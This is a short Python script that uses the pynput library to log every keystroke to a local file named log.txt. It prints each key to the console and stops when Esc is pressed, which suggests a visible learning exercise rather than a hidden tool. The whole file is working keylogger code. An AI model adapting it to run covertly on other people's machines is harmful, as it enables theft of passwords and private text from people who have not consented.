import pynput
from pynput.keyboard import Key,Listener
import datetime

def create_file():
    
    try:
        with open("log.txt","x") as f:
            f.write(f"Created {str(datetime.date.today())}\n")
    except FileExistsError:
        print(f"File already exists.")
        with open("log.txt","a") as f:
            f.write(f"\nLog started at {str(datetime.datetime.now())}\n")

def on_press(key):
    
    write_file(key)
    try:
        print("key {0} pressed".format(key.char))
    except AttributeError:
        print("special key {0}".format(key))

def write_file(key):
    
    with open("log.txt","a") as f:
        if key == Key.enter:
            f.write("\n")
        elif key == Key.space:
            f.write(" ")
        elif key == Key.tab:
            f.write("/t ")
        elif hasattr(key, "char") and key.char is not None:
            f.write(key.char)
        else:
            f.write(f"[{key}]")

def on_release(key):

    print("{0} released".format(key))
    if key == Key.esc:
        return False
    
create_file()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()